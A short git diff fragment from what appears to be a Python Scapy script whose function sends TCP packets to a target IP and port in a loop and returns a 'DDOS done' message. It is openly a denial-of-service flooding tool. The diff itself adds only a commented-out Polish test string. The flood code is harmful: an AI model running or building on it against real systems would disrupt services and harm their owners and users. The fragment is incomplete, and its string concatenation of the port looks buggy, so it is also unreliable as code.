@@ -20,3 +20,4 @@ def main_function(targetIp, port):
         packet = IP(dst=targetIp) / TCP(sport=source_port, dport=port)
         send(packet)
     return 'DDOS done; target ip: '+ targetIp + " on port" + port
+    # return 'jakiescosconiewiemczymjestalewyswietlasiewiectakbedetestowal'
